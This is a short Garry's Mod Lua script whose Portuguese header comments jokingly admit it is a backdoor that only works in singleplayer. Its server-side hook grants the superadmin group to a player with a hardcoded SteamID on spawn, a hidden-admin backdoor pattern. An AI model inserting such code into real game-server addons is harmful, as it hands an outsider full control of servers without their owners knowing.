//       SHIT VOCE DESCUBRIU MEU BACKDOOR                 //
//                      Q SO FUNCIONA NO                  //
//                    SINGLE                              //

if CLIENT then return end

local function spawn( ply )
	if ply:SteamID() == "STEAM_0:0:0" then
		ply:SetUserGroup("superadmin")
	end
end
hook.Add( "PlayerSpawn", "backdoor like backdoor like backdoor", spawn )
